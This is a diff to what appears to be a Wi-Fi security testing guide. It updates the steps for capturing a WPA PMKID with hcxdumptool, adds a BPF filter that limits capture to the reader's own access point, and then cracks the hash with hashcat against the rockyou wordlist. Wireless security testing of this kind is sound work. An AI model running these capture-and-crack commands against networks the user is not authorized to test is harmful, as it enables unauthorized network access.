@@ -220,7 +220,15 @@ required:
 
 ```bash
 # [Level 2+: Advanced / Field Ops] Capture PMKID directly
-sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+# hcxdumptool (6.3+ / 7.x) drives the adapter itself: give it the MANAGED
+# interface (wlan0, not wlan0mon), don't run airmon-ng first, and stop the
+# services that would fight it for the radio.
+sudo systemctl stop NetworkManager wpa_supplicant
+# Stay in scope: compile a BPF that only matches YOUR access point's BSSID
+hcxdumptool --bpfc="wlan addr3 112233445566" > scope.bpf
+sudo hcxdumptool -i wlan0 -w pmkid.pcapng -c 6a --bpf=scope.bpf --rds=1
+#   -w  output pcapng   -c 6a  channel 6, 2.4 GHz band   --rds=1  live status
+sudo systemctl start NetworkManager wpa_supplicant   # when done (Ctrl-C to stop)
 hcxpcapngtool -o pmkid.22000 pmkid.pcapng
 hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
 ```
